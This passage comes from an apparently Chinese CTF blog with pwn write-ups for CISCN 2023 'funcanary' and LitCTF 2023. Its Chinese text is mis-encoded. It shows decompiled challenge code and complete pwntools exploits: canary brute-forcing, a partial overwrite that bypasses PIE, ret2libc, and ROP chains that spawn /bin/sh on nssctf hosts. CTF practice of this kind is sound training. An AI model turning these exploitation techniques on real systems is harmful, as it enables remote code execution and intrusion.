ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000496710</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000402404</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;3. å‹‡é—¯å¤©æ¶¯\n&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;æ¥å‡ ç“¶ï¼Ÿ\n&#x27;</span>,<span class="string">b&#x27;-10000&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;&gt; &#x27;</span>,<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;ï¼š\n&#x27;</span>,p)</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>ç®—æ˜¯éå¸¸ç®€å•çš„é¢˜ç›®äº†</p><h1 id="CISCN-2023-åˆèµ›-funcanary"><a href="#CISCN-2023-åˆèµ›-funcanary" class="headerlink" title="[CISCN 2023 åˆèµ›]funcanary"></a>[CISCN 2023 åˆèµ›]funcanary</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653181.png" alt="image-20240509113441769" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">__pid_t</span> v3; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  sub_1243();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fork();                                <span class="comment">// å­è¿›ç¨‹</span></span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v3 )</span><br><span class="line">    &#123;</span><br><span class="line">      wait(<span class="number">0LL</span>);                                <span class="comment">// çˆ¶è¿›ç¨‹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;welcome&quot;</span>);                          <span class="comment">// å­è¿›ç¨‹</span></span><br><span class="line">      sub_128A(<span class="string">&quot;welcome&quot;</span>, a2);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;have fun&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;fork error&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¦–å…ˆæ˜¯çˆ¶å­è¿›ç¨‹çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">sub_128A</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+0h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+68h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x80</span>uLL);                        <span class="comment">// çˆ†ç ´Canary</span></span><br><span class="line">  <span class="keyword">return</span> v2 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œé¢ä¼šæº¢å‡º0x10ä¸ªå­—èŠ‚ï¼Œä½†æ˜¾ç„¶è¦çˆ†ç ´Canaryï¼Œè€Œ<img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653182.png" alt="image-20240509113846870"></p><p>æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œä½†æ˜¯è¦ç»•è¿‡Pieï¼Œç›´æ¥è¦†ç›–å°¾å·´3å­—èŠ‚ç¬¬å››ä¸ªå­—èŠ‚çˆ†ç ´å³å¯</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">from LibcSearcher import*</span><br><span class="line">from <span class="class"><span class="keyword">struct</span> <span class="title">import</span> <span class="title">pack</span></span></span><br><span class="line"><span class="class"><span class="title">context</span>.<span class="title">log_level</span>=</span><span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">path=<span class="string">&#x27;./service&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =lambda num=<span class="number">4096</span>:io.recv(num)</span><br><span class="line">ru  =lambda content,drop=False:io.recvuntil(content,drop)</span><br><span class="line">rl  =lambda :io.recvline()</span><br><span class="line">sla =lambda flag,content:io.sendlineafter(flag,content)</span><br><span class="line">sa  =lambda flag,content:io.sendafter(flag,content)</span><br><span class="line">sl  =lambda content:io.sendline(content)</span><br><span class="line">s   =lambda content:io.send(content)</span><br><span class="line">irt =lambda :io.interactive()</span><br><span class="line">tbs =lambda content:str(content).encode()</span><br><span class="line">leak=lambda name,addr :info(f<span class="number">&#x27;</span>&#123;name&#125;====&gt;&#123;hex(addr)&#125;<span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">local=0</span></span><br><span class="line"><span class="string">def run():</span></span><br><span class="line"><span class="string">    if local:</span></span><br><span class="line"><span class="string">        return process(path)</span></span><br><span class="line"><span class="string">    return remote(&#x27;</span>node5.anna.nssctf.cn<span class="number">&#x27;</span>,<span class="number">29486</span>)</span><br><span class="line"></span><br><span class="line">def debug(duan=<span class="number">0</span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">io=run()</span><br><span class="line">def leak_canary():</span><br><span class="line">    canary=<span class="string">&quot;\x00&quot;</span></span><br><span class="line">    offset=<span class="number">0x68</span></span><br><span class="line">    <span class="keyword">for</span> j in range(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> k in range(<span class="number">0xff</span>): </span><br><span class="line">            payload=<span class="string">&#x27;a&#x27;</span>*offset+canary+chr(k)</span><br><span class="line">            io.sendafter(<span class="string">&quot;welcome\n&quot;</span>,payload)</span><br><span class="line">            try:</span><br><span class="line">                a=io.recv(timeout=<span class="number">0.2</span>)</span><br><span class="line">                <span class="keyword">if</span> a==b<span class="string">&quot;have fun\n&quot;</span>:</span><br><span class="line">                    canary+=chr(k)</span><br><span class="line">                    print(canary)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            except:</span><br><span class="line">                pass</span><br><span class="line">    <span class="keyword">return</span> canary</span><br><span class="line">catflag=<span class="number">0x0231</span></span><br><span class="line">canary=leak_canary()</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">16</span>):</span><br><span class="line">        payload = b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * <span class="number">0x68</span> + bytes(canary) + b<span class="number">&#x27;</span>A<span class="number">&#x27;</span> * <span class="number">8</span> + p16(catflag)</span><br><span class="line">        io.send(payload)</span><br><span class="line">        <span class="meta">#pause()</span></span><br><span class="line">        a = io.recvuntil(<span class="string">&quot;welcome\n&quot;</span>,timeout=<span class="number">1</span>)</span><br><span class="line">        print(a)</span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;welcome&quot;</span> in a:</span><br><span class="line">                catflag += <span class="number">0x1000</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> b<span class="string">&quot;NSSCTF&quot;</span> in a:</span><br><span class="line">            print(a)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯è¿œç¨‹æ‰“ä¸é€šï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œcanaryçˆ†ç ´ä¸å‡ºæ¥ï¼Œå¾ˆå¥‡æ€ª</p><h1 id="LitCTF-2023-ç‹ ç‹ çš„æº¢å‡ºæ¶…"><a href="#LitCTF-2023-ç‹ ç‹ çš„æº¢å‡ºæ¶…" class="headerlink" title="[LitCTF 2023]ç‹ ç‹ çš„æº¢å‡ºæ¶…~"></a>[LitCTF 2023]ç‹ ç‹ çš„æº¢å‡ºæ¶…~</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">91</span>]; <span class="comment">// [rsp+10h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v5; <span class="comment">// [rsp+6Bh] [rbp-5h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [rsp+6Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave your message:&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(buf);                             <span class="comment">// å°±ä¸€ä¸ªæ˜¾ç„¶\x00ç»•è¿‡</span></span><br><span class="line">  <span class="keyword">if</span> ( v5 &gt; <span class="number">0x50</span>u )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hacker&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Ok,Message Received&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ¼æ´å¾ˆç®€å•ï¼Œstrlenç»•è¿‡å³å¯ï¼Œç»™äº†Libcï¼Œåˆ©ç”¨libcçš„ropchainå³å¯</p><p>è€è§„çŸ©å…ˆputså‡ºlibcåŸºå€ä¹‹åç›´æ¥ç»•è¿‡</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000004007d3</span></span><br><span class="line">buf=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x67</span></span><br><span class="line">pal1=p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(buf+pal1)</span><br><span class="line">data=io.recvuntil(<span class="string">&#x27;Ok,Message Received\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-<span class="number">0x84420</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p=buf+p64(<span class="number">0x0000000000400556</span>)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>æˆ–è€…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28955</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x4007d3</span></span><br><span class="line">buf=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x67</span></span><br><span class="line">pal1=p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(buf+pal1)</span><br><span class="line">data=io.recvuntil(<span class="string">&#x27;Ok,Message Received\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-<span class="number">0x84420</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+<span class="number">0x000002284d</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">ret=p64(<span class="number">0x0400556</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p=buf+ret+ret</span><br><span class="line"><span class="comment"># p+=p64(pop_rdi_ret)+p64(binsh)+p64(system)</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000036174</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000034550</span>) <span class="comment"># mov qword ptr [rdx], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000b1d69</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000034550</span>) <span class="comment"># mov qword ptr [rdx], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000023b6a</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x000002601f</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000b1d69</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; 